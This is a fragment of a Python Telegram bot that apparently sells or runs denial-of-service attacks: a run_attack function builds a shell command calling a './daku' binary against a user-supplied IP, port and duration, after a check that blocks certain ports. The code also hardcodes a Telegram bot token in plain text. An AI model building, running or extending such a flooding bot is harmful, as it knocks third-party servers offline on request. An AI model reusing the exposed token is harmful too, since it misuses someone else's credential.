...
TELEGRAM_BOT_TOKEN = '7901196184:AAGk7rHjiFP_-A7VxpuHH4eZ3GVu02pnDyY'
    ...
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            ...
            text=(
                ...
                "*📺 LINK: https://youtu.be/ZuBEu76PE6Y?si=05h-jT9rXw8GvRNS*"
            ),
            parse_mode='Markdown'
        )
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./daku {ip} {port} {duration} {1000}"
